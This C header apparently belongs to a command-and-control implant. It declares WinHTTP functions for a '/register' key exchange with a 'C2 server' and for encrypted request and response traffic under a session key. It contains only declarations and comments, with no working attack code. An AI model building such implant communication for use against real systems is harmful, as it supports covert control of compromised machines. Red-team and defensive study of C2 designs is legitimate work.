#ifndef HTTP_H
#define HTTP_H

#include <stdint.h>

/**
 * @brief POST raw bytes to an HTTP endpoint via WinHTTP.
 *        Used for the /register key exchange (plaintext body).
 * @param host         C2 server hostname or IP.
 * @param port         TCP port.
 * @param path         Request path (e.g. "/register").
 * @param body         Request body bytes.
 * @param body_len     Request body length.
 * @param out_body     Receives heap-allocated response body. Caller must free().
 * @param out_body_len Receives response body length.
 * @return 0 on success, -1 on failure or non-200 status.
 */
int http_post_raw(const char *host, int port, const char *path,
                  const uint8_t *body, int body_len,
                  uint8_t **out_body, int *out_body_len);

/**
 * @brief Encrypt plain_data with SESSION_KEY, POST it, then decrypt the response.
 * @param host          C2 server hostname or IP.
 * @param port          TCP port.
 * @param path          Request path.
 * @param plain_data    Plaintext request body (NULL treated as empty).
 * @param plain_len     Plaintext length in bytes.
 * @param out_plain     Receives heap-allocated decrypted response. Caller must free().
 * @param out_plain_len Receives decrypted response length.
 * @return 0 on success, -1 on failure.
 */
int http_post_encrypted(const char *host, int port, const char *path,
                        const uint8_t *plain_data, int plain_len,
                        uint8_t **out_plain, int *out_plain_len);

#endif /* HTTP_H */
